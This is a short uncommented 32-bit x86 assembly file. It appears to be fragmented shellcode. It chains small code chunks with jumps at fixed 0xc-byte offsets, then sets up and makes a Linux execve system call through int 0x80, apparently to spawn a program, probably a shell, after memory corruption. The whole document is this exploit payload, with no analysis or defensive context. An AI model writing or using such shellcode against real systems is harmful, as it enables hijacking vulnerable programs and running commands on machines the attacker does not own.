BITS 32
global _start
_start:

mov    esi,esp
sub    esi,0x70
jmp    esi

mov    al,0xb
add    esi,0xc
jmp    esi

xor    edx,edx
add    esi,0xc
jmp    esi

xor    ecx,ecx
add    esi,0xc
jmp    esi

sub    esp,0x34
add    esi,0xc
jmp    esi

mov    ebx,esp
push   ecx
xor    esi,esi
int    0x80